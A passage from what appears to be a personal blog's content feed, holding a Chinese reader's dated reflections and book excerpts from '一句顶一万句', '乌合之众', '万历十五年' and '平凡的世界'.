关系中，有的人选择了逃避，找情人，有的人选择了坚持和迁就，维持着家庭生活。很难说两种选择具体哪个好，如果换做是我，我会坚持，因为换一个人也未必真得说得来，哪怕开始的时候你们说得来。</p><p>除了畏惧，我也在思考，说得来是不是真得像书中说得那样，无法通过后期努力改善。讨论这个问题首先要从说得来的内容说起，人与人互相交流的主要问题是爱好、抉择、工作、朋友等。当然除了内容，人也很重要，相处的人是不是愿意跟你一起寻找话题，创造话题。内容是可以改变的，你可以培养爱好，搜集做抉择的依据，了解她工作的内容，结交共同的朋友。但人是很难改变的，一般来讲，人的性格、三观和他的行事风格很难有什么变化，至少我是如此。所以找一个什么样的人就很关键了。</p><p>我想起之前大冰说过，他那些婚后过的很好的朋友，夫妻之间都有一个共同点，就是永远都有话说。有话说，还是永远都有话说。我能不能找到这样的人呢？工作和学业暂时都定了，唯有感情没有。我承认至少目前我还是基因的奴隶，习惯于被身材和外貌吸引，即便我经常提醒自己，这些阅读过的书籍也在提醒我，可我还是会忽视这些提醒。慢慢地这种一定要开始改变一下，外在的东西无法维持太长时间，而内在的品质包括三观、性格和与人沟通的能力是充斥在生活中各个方面的。人大多数时候都要通过反人性来获得幸福，何去何从，希望以后的自己能慎重做选择，同时能承担选择失败的责任。</p><p>生活都充满了随机性，更别说男女之间的感情，就像当年去衡水一样，各种巧合都会发生，我唯一能决定的是自己，我尽可能把自己培养成能适应各种性格的人，这样婚姻成功的概率就会更高一些。</p><hr><p>李奕轩  2025.04.19 下午4：00 晴</p>]]></content>
      
      
      <categories>
          
          <category> 书籍阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读后感 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一句顶一万句书摘</title>
      <link href="/2025/04/16/yi-ju-ding-yi-wan-ju-shu-zhai/"/>
      <url>/2025/04/16/yi-ju-ding-yi-wan-ju-shu-zhai/</url>
      
        <content type="html"><![CDATA[<h1 id="《一句顶一万句》"><a href="#《一句顶一万句》" class="headerlink" title="《一句顶一万句》"></a><strong>《一句顶一万句》</strong></h1><ol><li><p>贼就贼吧，我五十顷地还养不起一个贼？</p></li><li><p>人心毒不是说它狠，是说大家遇事不往好处想，盼着事坏。</p></li><li><p>世上的事情，原来件件藏着委屈。</p></li><li><p>人要一堵上气，就忘记了事情的初衷，只能想着能气着别人，忘记了也耽误自己。</p></li><li><p>去年年底，老史不看锡剧看社火，不是因为锡剧看厌了，恰恰是因为苏小宝在苏州的老舅死了，苏小宝赶回苏州奔丧，老史觉得戏台上一下空了，这才抽出身来，看万民舞社火。老史不看社火，还发现不了杨摩西；杨摩西能进县政府，以为该感谢社火，其实应该感谢锡剧中这位男旦苏小宝，接着应该感谢苏小宝的老舅，死得是个时候。</p></li><li><p>遇小事可以指望别人，遇到大事，千万不能把自个儿的命运，栓到别人身上。</p></li><li><p>如今天天揉馒头蒸馒头，日子太实了。正是因为太实了，所以想”虚“一下。</p></li><li><p>明白不是明白吴香香，而是明白自己；既然遇事跟她计较不是，计较也计较不过她，不如像老高对待老白一样，干脆不计较；或者，反正与她说不明白道理，这时再计较道理，反倒是不懂道理了。（<strong>吴摩西没有想到的是，吴香香和老高早在三四年前就已经在一起了，那时姜武甚至还在世</strong>）</p></li><li><p>牛爱国虽然当的也是汽车兵，但到了部队，并没有开上汽车，在炊事班做饭；杜清海虽然当的是步兵，但连队有一辆卡车，他倒在连队开汽车。</p></li><li><p>几个”你说呢“下来，杜青海也将自己的事码清楚了，二人心思都轻快了许多。</p></li><li><p>不爱说话和没话说是两码事。</p></li><li><p>爱不爱说话，原来也要看是跟谁在一起。</p></li><li><p>这种事，俗话说得好，捉贼要捉脏，捉奸要捉双，没有捉住，这种事，宁信其无，不信其有。</p></li><li><p>又三年过去，牛爱国方知，在部队的时候，杜清海给自己码放事情，出的都是好主意；唯有在滹沱河畔，他和庞丽娜的事，杜青海出的主意，打根上就错了。</p></li><li><p>戏里说的事，也是世上的事，怎么戏里说的，就比世上的事有意思呢？</p></li><li><p>我一下又感到自己被卖东西生地方。爹，到一个新地方，我夜里怕黑。</p></li><li><p>过去能跑的时候没跑，现在不能跑的时候跑了，要说可怜，也就这点可怜。</p></li><li><p>会说话不是说他话多，嘴不停，而是说起话来，不与你抢话，有话让你先说，他再接着说。</p></li><li><p>曹青娥这时才明白，人是掰扯不得的，掰扯了别人，就是掰扯了自己。</p></li><li><p>她的亲爹姜虎，当年就是死在山西沁源县，没想到曹青娥长大，又嫁到了沁源县。</p><hr><p>2025.04.17 晚9:15 星期四</p></li><li><p>牛爱国一笑，两人又说起小学时班上的许多同学，冯文修、马明起、李顺、杨永祥、宫益民、崔玉芝、董海花等。二十多年过去，都各奔东西；其中一个叫王家成的已经死了，一个叫胡双利的疯了。李克智：“人生在世，草木一秋哇。”</p></li><li><p>我活了七十岁，明白一个道理，世上别的东西都能挑，就是日子没法挑。</p></li><li><p>你跟她说得着，是因为她现在由丈夫养着，你就是与她说个话；等你养她，就成了过日子，到时候就该说过日子了。</p></li><li><p>儿女在世上都不如意，让曹青娥有话无处说，或者有话不说，除了是失望，还有对他们的无奈罢了。</p></li><li><p>如是过去，牛爱国觉得饭馆老板说得对，现在却觉得他说错了。事情想不明白，人的忧愁还少些；事情想明白了，反倒更加忧愁了。</p></li><li><p>啥事看近点儿，事情倒能想得开；看得长，心就更宽不了了。</p></li><li><p>从车上往下看，空空荡荡的汽车站里，就剩下娘一个人，拄着拐杖，嘴在张着，曹青娥不禁流下了泪。</p></li><li><p>解释不清不是事情不好解释，而是事情之中藏着的曲里拐弯的道理，一时无法说清楚。</p></li><li><p>牛爱国也明白了，妈曹青娥临走的时候，想带走一把手电，路上好照亮，临死时喊“爹”，或者打着手电好找爹。妈曹青娥养了四个儿女，最终能猜出她心思的，竟是七岁的百惠。</p></li><li><p>你看看，一年多没见，你咋成了我，我咋成了你。</p></li><li><p>姐已经老了，牛爱国看姐，姐确实老了，眼角堆满了皱纹，脸上的肉往下嘟噜着。</p></li><li><p>这时，牛爱国想起妈曹青娥活着的时候，给他讲她爹吴摩西的故事。当年曹青娥还叫“巧玲”的时候，她娘吴香香跟着银匠老高跑了。吴摩西和巧玲去找吴香香和老高，就是假找。没想到七十年过去，自己也成了吴摩西，两个出门假找的人，一个是曹青娥的爹，一个是她的儿子。</p></li><li><p>日子是过以后，不是过从前。我要是想不清楚这一点，也活不到今天。这话跟妈曹青娥生前说得一样。</p><hr><p>2025.04.19 周六 晴 下午3:17</p></li></ol><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      <categories>
          
          <category> 书籍阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 书摘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>乌合之众书摘</title>
      <link href="/2025/04/09/wu-he-zhi-zhong-shu-zhai/"/>
      <url>/2025/04/09/wu-he-zhi-zhong-shu-zhai/</url>
      
        <content type="html"><![CDATA[<p>文明诞生之初，一群来自不同地方的人，因为移民、入侵或占领等原因聚集在一起。他们血缘不同，语言和信仰也不同。法律是这些人结为一体的唯一纽带，尽管相关法律并没有完全得到所有头领的承认。这些混乱的人群，有着十分突出的群体特征。他们有短暂的团结，有英雄主义、易冲动、性情狂狷等群体特征。没有什么东西能把他们牢固地联系在一起，因为他们是野蛮人。漫长的岁月是真正的造化者，种族就是它的作品。在环境长期一致、种族间不断通婚、一起共同生活等因素的作用下，不同的小群体慢慢融合成一个整体、一个种族，一个有着共同特征和感情的群体就此形成了，并且在遗传的作用下日益稳固。这群人变成了一个民族，渐渐有能力摆脱它的野蛮状态了。但是，只有在长期努力，经过不断重复的斗争以及无数次的反复，它才能获得某种理想之后，走出野蛮状态。</p><p>这个理想的性质并不十分重要，不管是崇拜罗马、雅典的强盛还是真主的胜利，都足以让一个种族中的每个人在感情和思想上形成完全的统一。在这个时候，一种包含着新制度、新信念和新艺术的新文明便诞生了。在追求自己理想的过程中，种族会逐渐具备某些素质，某些建立丰功伟业不可缺少的素质。无须怀疑，它有时仍然是乌合之众，但在它变幻不定的特征背后，会形成一个稳定的基础，即这个种族的秉性。种族的秉性支配着该种族狭小的范围内的机遇。时间在做完其创造性工作之后，便开始破坏的过程。不管是神还是人，全都无法逃出它的手掌。当某种文明强盛到一定的程度，复杂到一定程度之后，便会止步不前。一旦止步不前，便注定走向衰落。</p><p>衰落是不可避免的，它以种族支柱——理想——的衰弱为标志。基于理想建立起的宗教、政治和社会结构也会随之发生动摇。随着种族的理想的消亡，种族团结、强盛的品质也会慢慢消失。个人的个性和智力可以增长，但种族集体的自我意识却会被个人强烈的自我意识的过度发展所取代，并伴随着种族性格的弱化和行动能力的衰弱。本来是一个民族、一个联合体、一个整体的人群，最终会变成一群缺乏凝聚力的个人——散沙。他们在一段时间里，仅仅因为传统和制度而被人为地聚集在一起。在这个阶段，人们被个人利益和愿望搞得四分五裂，失去了治理的能力，即使在最微不足道的事情上，也需要领导管理，于是，国家开始发挥引人注目的影响。</p><p>随着种族的理想的消亡，种族团结、强盛的品质也会慢慢消失。个人的个性和智力可以增长，但种族集体的自我意识却会被个人强烈的自我意识的过度发展所取代，并伴随着种族性格的弱化和行动能力的衰弱。本来是一个民族、一个联合体、一个整体的人群，最终会变成一群缺乏凝聚力的个人——散沙。他们在一段时间里，仅仅因为传统和制度而被人为地聚集在一起。在这个阶段，人们被个人利益和愿望搞得四分五裂，失去了治理的能力，即使在最微不足道的事情上，也需要领导管理，于是，国家开始发挥引人注目的影响。随着古老理想的丧失，这个种族的才华也消失殆尽了。从此，这个种族的人仅仅是一群独立的个人，他们回到了自己的原始状态——群体。他们既缺乏统一性，也没有未来，只有乌合之众的短暂的特性。他们的文明失去了稳定性，只能随波逐流。群众掌握至上的权力，野蛮风气盛行。文明也许依然辉煌，源远流长的历史赋予其华丽的外表，但这座岌岌可危的大厦早已被侵蚀，支撑不了多久，风暴一来，立刻就会崩塌。从野蛮到文明，一路追寻梦想，当这个梦想失去力量的时候，便开始衰落，最终走向死亡。这就是一个民族的生命周期。</p><ol><li><p>群体心理有着与“理性”个人完全不同的心理特征，而且群体不同，心理特征也不同。</p></li><li><p>这是因为，历史的所有事实无一例外地向我们证实，社会组织和一切生命有机体一样繁复庞杂，我们无权强迫社会组织在一夜之间突然完成深远变革。</p></li><li><p>所有历史事件无一例外地告诉我们，若文明赖以建立的道德基础失去力量，无意识的野蛮群体最终会通过各种暴力革命手段迫使其解体或毁灭。</p></li><li><p>领导群体靠的不是纯粹的平等学说，而是情感。群体是情感的奴隶，只要找到能让他们动心的东西即可。</p></li><li><p>打算实施新税制的立法者会选择最公正的税收方式吗？不，对群体来说，最“不公正”的才是最好的。那些清楚易懂、负担小的税收制度，才是最容易被人们接受的。每天为日常消费品支付一点儿税金，不会干扰群体的消费习惯，如此，征税就在不知不觉中进行了。倘若按薪资或其他任何收入的比例征税，让纳税人一次性缴一大笔钱，哪怕这种税制的负担比其他税制轻十倍，都会招致无数人的反对。立法者深知，数额较大的支出，容易刺激人们的金钱损失想象，所以新税收制度常常用难以察觉到的办法实行。而这种远见，正是群体缺乏的。</p></li><li><p>意识人格的消失和情感、思想向一个明确方向的转变，是即将形成有组织的群体的主要特征。</p></li><li><p>由于任何一种精神结构都包含各种性格的可能性，环境突变会让其中某些可能性表现得更为突出。</p></li><li><p>在对待包括宗教、政治、道德、爱憎等属于情感领域的每一件事情的态度上，智商再怎么杰出的人，也不见得比凡夫俗子高明多少。一个伟大数学家和鞋匠之间的智商可能有天壤之别，但就性格来说，他们之间的差别微乎其微，甚至根本没有。</p></li><li><p>在群体中，每种感情和行动都有传染性，其程度足以使个人随时准备为集体利益牺牲个人利益，而这正是与个人与生俱来的天性极为对立的情感倾向，如果不是成为群体中的一员，则很难产生这种情感倾向</p></li><li><p>群体是个无名氏，个人不必承担责任，如此以来约束着个人行为的责任感便消失了，他便会肆意妄为。</p></li><li><p>孤立的个人具有主宰自己的反应行为的能力，群体则缺乏这种能力。</p></li><li><p>群体意识里没有障碍一说，即使是有，那也是充满敌意的挑衅。</p></li><li><p>群体对于这样一个事实视若无睹，他们永远只看到他们认为应该看到或者他们希望看到的东西。这就意味着，群体惯于用歪曲性的想象力把这种由想象建立的幻觉与真实的事实混为一谈。</p></li><li><p>我们习惯于说童言无忌，哪怕只有一点基本的心理学修养，也会知道事情恰恰相反，儿童最爱撒谎。</p></li><li><p>当历史传承到需要记载下来的那一刻时，早已丧失了它的本来面貌，我们只能把史学著作当作纯粹想象的产物。它们是对观察有误的事实所做的无根据的记述，并且混杂了作者对思考结果的解释。</p></li><li><p>各种事实都证明群体的证词极不可靠，它甚至能够达到无以复加的地步。</p></li><li><p>那些在人类历史上发挥过重大作用的伟大人物，如赫拉克利特、释迦牟尼或穆罕默德，我们有一句真实的记录吗？极可能一句也没有。所有能够打动群众的，能够在群众范围内得以流传并保留下来的，只是这些伟人在神话中的形象。实事求是地说，他们的真实生平对我们来说无关紧要。我们想要知道的，是伟人在神话中呈现的形象。我们要的是能打动我们心灵的神话英雄，而不是一时的真实英雄。</p></li><li><p>群体的想象力会改变一切，不论这件事是真实的还是虚构的。正因为这样，历史才会背离它的真相，呈现出光怪陆离的面貌。</p></li><li><p>不幸的是，群体感情的夸张倾向，通常把人类的恶劣表现到极致。1527年5月6日夜，罗马被雇佣军占领，八千多名百姓被杀，但这只是开始。夜晚狂欢过后，极度激动的雇佣兵开始洗劫教堂，他们还洗劫教堂和要人的宫殿，闯进修道院强奸修女，残酷迫害百姓。</p></li><li><p>群体很容易干出恶劣、极端的勾当。这是原始人的本能遗传的残留，孤立的个人因为担心受罚，不得不约束自己</p></li><li><p>群体只是擅长把感情提升到极高或极低的境界。</p></li><li><p>希望感动群体的演说家必须锋芒毕露、信誓旦旦。他们少不了要夸大其词，而且以不断重复、绝对不说理的方式证明任何事情——这些都是演说家惯用的技巧。</p></li><li><p>他们并非是有所醒悟，因为群体只会干两种事，锦上添花或落井下石。群体喜欢践踏被他们剥夺了权力的专制者。群体随时会欺压软弱者，但对强权低声下气！</p></li><li><p>群体最终会回归保守，群体可能渴望通过改朝换代换取卑微的需求，为了达到目的，他们常常发动暴力革命，但却常常沿用旧制度，从中国王朝的更迭中便可看出端倪。这些旧制度本质反映出了种族对等级制的需要，因此专制者轻易便能拥有整个种族的顺从。</p></li><li><p>在生活中，有的人因为不能向自己的同胞发泄这种本能，便发泄在动物身上。群体捕猎的热情与凶残，和这种破坏性本能，有着同样的根源。群体杀死没有反抗能力的牺牲者，正是十分懦弱的残忍。</p></li><li><p>回顾历史，我们发现，群体为了一知半解的信仰、观念和只言片语，便可以英勇地面对死亡。</p></li><li><p>如果不计名利、顺从和绝对献身于真正的（或虚幻的）理想都算作美德的话，那么毋庸置疑，群体最具备这些美德，而且他们达到的水平，哪怕是德行最高尚的哲学家也望尘莫及。</p></li><li><p>只有简单而明了的观念，才能被群体接受，但并不是所有观念都是简单明了的，因此必须经过一番彻底改造，使之变得通俗易懂，才能被平庸的大众接受。那些高深莫测的哲学或科学观念，群体自卑心理导致的智力水平根本无法理解，更别谈接受了。因此，对它们的改造必须更加彻底。种族间理性程度和聪明才智都不同，因此这种改造有时大一些，有时小一些，但都必须向低俗化和简单化改造。</p></li><li><p>群体推理只是把表面上相似的事物搅在一起，并且会立刻把具体的事物普遍化。不妨说他们并不推理或只会错误地推理，而且也绝不会受到推理过程的影响。</p></li><li><p>凡是和群体有密切交往的演说家，无一不擅长建立对群体有诱惑力的形象。任何一个人做到这一点，便可以达到自己的目的。即使是20本富有真知灼见的著作，也不如几句有感召力的话语更能说服群众。</p></li><li><p>有些意见轻而易举就得到普遍认同，这是因为大多数人没有能力根据推理形成自己的独特看法。</p></li><li><p>表象总是比真相起着更重要的作用，群体无视现实，无论是亲眼所见，还是逻辑严谨的劝告，群体都不为所动。那些能活灵活现反映人物形象的戏剧表演，就能对群体产生巨大的影响。</p></li><li><p>想领导群体，就得在他们的想象上下功夫。几乎所有侵略者的权力和国家的威力，都是建立在群体的想象上的。</p></li><li><p>究竟如何影响群众想象力呢？只需要注意一点，不可求助于智力和推理，这也就是说，绝对不能够采用论证的方式。</p><hr><p>2025.04.09 星期三 晚21：00</p></li><li><p>假如我们对群体的这些特点做更细致的研究，就会发现无论是在狂热宗教信仰的时代，还是政治大动荡的时代，都有同样的感情和古怪的形式——没有比宗教感情更好的称呼了，这就是偶像崇拜。</p></li><li><p>偏执与妄想是宗教感情的必然伴侣。</p></li><li><p>无论时代进步到何种程度，即使不再有圣坛与雕像存在，也会有新的形式来替代。</p></li><li><p>只有经验这位最好的老师最终会指出我们的错误——必须废除我们那些可恶的教科书和可悲的考试，代之以勤劳的教育，让我们的年轻人回到田野和工厂，回到他们今天不惜任何代价逃避劳动的事业。向人灌输大量肤浅的知识，不出差错地背诵教科书，不可能提高我们的智力水平。能够帮助我们走向成功的条件是判断力，是经验，是开拓精神和个性！而这些优良品质，偏偏不是死读书就能得来的。</p></li><li><p>思想只有在自然而正常的环境中才能形成。因此，我们需要年轻人每天从工厂、矿山、法庭、建筑工地和医院等地方，获得大量的感官印象；他得亲眼看到各种工具、材料和操作；他得与顾客和劳动者在一起，不管他们干得是好是坏，也不管他们是赚是赔。只有采用这种方式，他们才能对那些从眼睛、耳朵、双手甚至味觉中得到的各种细节，得到微不足道的理解。学习者在不知不觉中获得了这些细节，默默地推敲，在心中逐渐成形，并且或迟或早地产生一些提示，让他们着手新的组合、简化、创意、改进或发明。</p></li><li><p>在教育的三个阶段，即儿童期、少年期和青年期，如果从考试、学历、证书和文凭的角度看，坐在学校板凳上啃理论和教科书的时间长得过头了，而且负担过重。采用的方法也糟糕透顶，以至于已经成为一种严重违反自然的、与社会对立的制度。过多地延长在学校学习的时间，培养懒汉的寄宿制度，过多的人为训练、教学和功课，对今后的时代完全没有考虑，对人的职业缺乏安排，对年轻人很快就要投身其中的现实世界装聋作哑，不考虑学生如何适应社会，不考虑人类为保护自己而必须从事的斗争，不教学生如何保持坚强意志……</p></li><li><p>有必要的准备、最重要的学习、丰富的常识、坚忍不拔的意志力，凡是年轻人应该拥有的知识，我们的学校一样也没有教。我们的教育不但没有让他们获得更好的生存能力，反而破坏了这些能力。这使得我们的年轻人一走入社会，进入他的活动领域，就开始遭遇一系列的痛苦与挫折，由此给他造成的创痛久久不能痊愈，甚至让他失去生活能力。这样的教育制度，对年轻人的精神和道德都造成了不良影响，甚至有难以恢复的可能。学校的幻想与美梦，在严酷的现实面前彻底地破灭了，强烈的欺骗感、失望感，是一个心理素质不完备的青年人难以承受的。</p></li><li><p>如果想要让群众相信什么，就先得搞清楚让他们兴奋的感情，再假装自己也有这种感情，必要时还得用极端的行为表现对这些感情的狂热。再打一套低级组合拳，用一些非常富有暗示性的概念改变他们的看法。如捏造场景、追忆往昔、憧憬未来等，这样才能够引导大众回到最初提出的观点上来，慢慢揭开激起某种感情的目的。</p></li><li><p>人和动物一样，有模仿的本能。这是必然的，因为模仿总是比创造容易。正是这种模仿，使得所谓时尚的力量如此强大。无论是意见、观念、文学作品还是服装，有多少人有足够的勇气与时尚作对？支配大众的是榜样，不是论证</p></li><li><p>包括意志在内的一切事物都会屈服于衰老</p></li><li><p>不存在任何引导意见的力量，再加上普遍信仰的毁灭，其最终结果就是对一切秩序都存在着极端分歧，并且使大众对于一切和他们没有直接利益的事情都漠不关心。</p></li><li><p>从众行为导致我们服从别人的怂恿</p></li><li><p>无论是天才还是智障，只要一受大众领袖的影响，就变成了被无意识情绪支配的生物。</p></li><li><p>要求一个善于思考的团体就某个并非技术性的问题发表意见时，智力就起不了多少作用。</p></li><li><p>群体的权力令人生畏，然而身份团体的权力更让人害怕。</p></li><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> 书籍阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 书摘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>万里十五年书摘</title>
      <link href="/2025/04/05/wan-li-shi-wu-nian-shu-zhai/"/>
      <url>/2025/04/05/wan-li-shi-wu-nian-shu-zhai/</url>
      
        <content type="html"><![CDATA[<ol><li><p>宫廷固然伟大，但是单调。即使有宫室的画栋雕梁和其他豪华装饰，紫禁城也无非是同一模式的再三再四的重复。</p></li><li><p>这一切都不能改变精神世界中的空虚和寂寞。在按着固定节奏流逝的时光之中，既缺乏动人心魄的事件，也缺乏龄人企羡的奇遇，这种冷酷的气氛笼罩一切，即使贵为天子，也很难有所改变。</p></li><li><p>她们的尸体经过火化后，埋葬在没有标记的坟墓里。</p></li><li><p>她是在最适当的时机来到了他的生活里，填补了他精神上的缺陷。凭借着机智和聪明，她很快就理解了命运为她作的安排，因而抓住现实，发挥了最大的能动性，从而达到自己预期的目的。</p></li><li><p>他询问这些与试举人，为什么他越想励精图治，但后果却是官僚的更加腐化和法令的更加松懈？这原因，是在于他缺乏仁民爱物的精神，还是在于他的优柔寡断。</p></li><li><p>但是不久以后，他就会发掘，他摆脱了张、冯之后所得到的自主之权，仍然受到种种约束，即使贵为天子，也不过是一种制度所需的产物。</p><hr><p>2025.04.05 晚19:25 </p></li><li><p>为什么万历在这个问题上没有采取更为强硬的立场，例如坚决地公开宣布他的主张，而且一口咬定立储大计属于他的权力范围，不容旁人置喙，而且进一步以意图不能实现即自动退位作为威胁，这都已经无法找到答案了。也许有一条理由可以作为解释，即本朝不是以法律治理天下臣民，而是以“四书”中的伦理作为主宰。皇帝和全国臣民都懂得父亲对儿子不能偏爱，哥哥对弟弟负有教导及爱护的义务，男人不能因为宠爱女人而改变长幼之序。正因为这些原则为天下人所普遍承认，我们的帝国才在精神上有一套共同的纲领，才可以上下一心，臻于长治久安。如果仅仅凭法律的条文作为治国的依据，则我们立国的根本就成了问题，一千多个县很难以父母官的身分领导他治下成千成万的庶民。所以，万历要弃长立幼的企图，纵使在法律上有可以左右迁就之处，但在坚持传统观念的臣僚心目之中，却早已不直于纲常伦理。臣僚们从来没有听说法律的施用可以与圣贤的教导相违，即使是皇帝也不得不承认这一点。在这样强大的道德和舆论的压力之下，他在公开场合不得不发表违心之论，否认他有弃长立幼的企图。</p></li><li><p>他们所需要的只是一个个性平淡的君主作为天命的代表，其任务就是在他们的争端无法解决时作出强制性的仲裁。他们要求这位守成之主与日常的生活隔绝，在仲裁争端中不挟带个人的嗜好和偏爱以引起更多的纠纷。</p></li><li><p>这种局面不打破，文官的双重性格发展得越来越明显，这也是精神与物质的分离。一方面，这些熟读经史的人以仁义道德相标榜，以发挥治国平天下的抱负为国家服务，以自我牺牲自许；一方面，体制上又存在那么多的罅隙，给这些人以那么强烈的引诱。</p></li><li><p>皇位是一种社会制度，他朱翊钧却是一个有血有肉的个人。一登皇位，他的全部言行都要符合道德的规范，但是道德规范的解释却分属于文官。</p></li><li><p>但是今天的大学士申时行对此早已涣然冰释，理解了其中的精微奥妙，因为我们的帝国在体制上实施中央集权；其精神上的支柱为道德，管理的方法则依靠文牍。</p></li><li><p>他的老成来自长期处理各项人事经验；这种经验，使他深知，我们这个帝国有一个特点：一项政策能否附注实施，实施后或成或败，全看它与所有文官的共同习惯是否相安无忧，否则理论上的完美仍不过是空中楼阁。</p></li><li><p>所以说来说去，施政的要诀，仍不外以抽象的方针为主，以道德为一切事业的根基。</p></li><li><p>因之，我们的政事，注重体制的安定，而不计较对一人一事的绝对公允。</p></li><li><p>管理我们这样一个大帝国，在许多问题上一定是要生罅隙的，张居正以整饬纪律自居，而实际上他是强迫要求各人保证不生罅隙。申时行用恕道待人，又鼓励诚信，就是期望各人自动地各尽其能地补救罅隙。</p></li><li><p>与海瑞同时的人所不能看清楚的是，这一段有关司法的建议恰恰暴露了我们这个帝国在制度上长期存在的困难：以熟读诗书的文人治理农民，他们不可能改进这个司法制度，更谈不上保障人权。</p></li><li><p>一个农民家庭如果企图生活稳定，并且获得社会声望，惟一的道路是读书做官。然而这条道路漫漫修远，很难只由一个人或一代人的努力就能达到目的。通常的方式是一家之内创业的祖先不断地劳作，自奉俭约，积铢累寸，首先巩固自己耕地的所有权，然后获得别人耕地的抵押权，由此而逐步上升为地主。这一过程常常需要几代的时间。经济条件初步具备，子孙就得到了受教育的机会。这其中，母亲和妻子的自我牺牲，在多数情形之下也为必不可少。所以表面看来，考场内的笔墨，可以使一代清贫立即成为显达，其实幕后的惨淡经营则历时至久。这种经过多年的奋斗而取得的荣誉，接受者只是一个人或至多几个人，但其基础则为全体家庭。因此，荣誉的获得者必须对家庭负有道义上的全部责任，保持休戚与共的集体观念。</p></li><li><p>当一个人口众多的国家，各人行动全凭儒家简单粗浅而又无法固定的原则所限制，而法律又缺乏创造性，其社会发展的程度必然受到限制</p><hr><p>2025.04.08 下午 3:10</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 书籍阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 书摘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>平凡的世界读后感</title>
      <link href="/2025/04/01/ping-fan-de-shi-jie-shu-zhai/"/>
      <url>/2025/04/01/ping-fan-de-shi-jie-shu-zhai/</url>
      
        <content type="html"><![CDATA[<h1 id="平凡的世界书摘"><a href="#平凡的世界书摘" class="headerlink" title="平凡的世界书摘"></a>平凡的世界书摘</h1><h2 id="精简版"><a href="#精简版" class="headerlink" title="精简版"></a>精简版</h2><ol><li><p>正是因为贫穷，因为吃不起好饭，因为年轻而敏感的自尊心。</p></li><li><p>透过城市生活的镜面，他似乎更清楚地看见了他已经生活过十几年的村庄–在那个他所熟悉的古老的世界里，原来有许多有意义的东西，现在看起来似乎有点平淡无奇了，而那里许多本来重要的事物过去他并没有留心，现在倒突然如此鲜活地来到了他的心间。</p></li><li><p>是的，生活就是这样，在我们都是小孩子的时候，一个人和一个人可能有家庭条件的区别，但孩子们本身的差别并不明显，可一旦长大了，每个人的生活道路会有多大的差别呀，有的甚至是天壤之别。</p></li><li><p>人活着，这种亲人之间的感情是多么重要，即使人的一生充满了坎坷和艰辛，只要有这种感情存在，也会感到一种温暖的慰藉。</p></li><li><p>她爷当年就死了，但她爷的地主帽子并没有埋进他的坟墓，而是作为主要遗产留给了父亲和她</p></li><li><p>他现在认识到，他是一个普普通通的人，应该按照普通人的条件正正常常地生活，而不要做太多非分之想。</p></li><li><p>生活已经在他面前展现出更为广阔的内容</p></li><li><p>他渐渐抛弃了这种虚荣或者说自卑，大大方方地站在队列中取他的饭。</p></li><li><p>可这位农村姑娘只要男方给她扯一身，还不要好布料，并且首先要给男方扯好衣服哩，太稀罕了，这大概只有戏里才有这样的先进人物吧。</p><hr><p>16章  2025.03.06 早 11:26</p></li><li><p>他的另外一个成熟的标志，就是对大人的行为开始具备批判的眼心。</p></li><li><p>此刻，田润叶没有心思从根本上检讨她的不幸，她只是悲叹自己的命运不好。</p></li><li><p>归根到底，他们只能这样，人只能按照自己的条件寻找终身伴侣，就好像庄稼一样，只能把豆角和玉米种在一块，而不能和小麦种在一起。</p></li><li><p>在这里谈不到诗情画意，也不允许有想象的翅膀，一个人连肚子也填不饱，怎么可能去想别的事情呢!</p></li><li><p>在一个人的思想还没有强大到自己能完全把握自己的时候，就需要在精神上依托另一个比自己更强的人。</p><hr><p>第二部 1章 2025.03.09 晚20:07</p></li><li><p>这样的城市是一个各色人等混杂的天地，而每一个层次的人又有自己的天地。</p></li><li><p>说句心里话，爸爸这辈子不再图享福，只图一口顺气，现在，爸爸就是睡到黄土里，心也平了。</p></li><li><p>一切都很明确，这个家不管是分还是不分，再也不会像往常一样和谐了。生活带来了繁荣，同时也把原有的秩序打破了。</p></li><li><p>通过不断地读书，少平认识到，只有一个人对世界了解得更广大，对人生看得更深刻，那么他才有可能对自己所处的艰难和困苦有更高意义的理解，甚至也会心平气静地对待欢乐和幸福。</p></li><li><p>和侯玉英这次以外的邂逅，使孙少平感慨万端。唉，时过境迁，他们这一茬人已经开始各自寻找自己的归宿。同学之中，有的已经结婚并且有了儿女，安安稳稳过起了光景日子，少年，少年，那时永远的逝去了……</p></li><li><p>她似乎认定，孙少平最终不会逃脱大多数农村学生的命运。</p></li><li><p>后来她才渐渐认识到，实际生活是冷酷的，因为种种原因，这些不能进入大学门，又进入不了公家门的农村青年，即使性格非凡，天赋很高，到头来仍然会被环境所征服，当然，不是说农村就一定干不出什么名堂，主要是精神境界很有可能被小农意识的汪洋大海所淹没…..</p></li><li><p>是的，他在我们的时代属于这样的青年：有文化，但没有幸运地进入大学或参加工作，因此似乎没有充分的条件直接参与到目前社会发展的主潮之中。另一方面，他们又不甘心把自己局限在狭小的生活天地里。因此他们往往带着一种悲壮的激情，在一条最为艰难的道路上进行人生的搏斗，他们顾不得高谈阔论或愤世嫉俗地忧患人类的命运。他们首先得改变自己的生存条件，同时也不放弃最主要的精神追求，他们既不鄙视普通人的世俗生活，但又竭力使自己对生活的认知到达更深的层次。</p></li><li><p>她兴奋的使，孙少平为她的生活环境树立了一个对应物，或者说给她的世界形成了一个奇特的种子。</p></li><li><p>是的，她和他尽管社会地位和生活处境不同，但人格上是平等的。这种关系只有在共同探讨的基础上才能形成，或许他们各自都有需要对方改造的地方，改造别人也就是对自己本身的改造。</p></li><li><p>她喜欢孙少平的正是他不伪装自己，并不因生活的窘迫就感到自己活得没有意义，她看得出来，少平甚至对苦难有一种骄傲感，只有更深邃地理解了生活的人才会在精神上如此强大。</p></li><li><p>当然，他们如此挣命，是因为生活突然充满了巨大的希望，有了希望，人就会产生激情，并且可以义无反顾地为之付出代价，在这样的过程中，才能真正体会到人生的意义。人生就是永不休止的奋斗，只有选定了目标并在奋斗中感到自己的努力没有虚掷，这样的生活才是充实的，精神也会永远年轻。</p><hr><p>2025.03.10 下午15：27 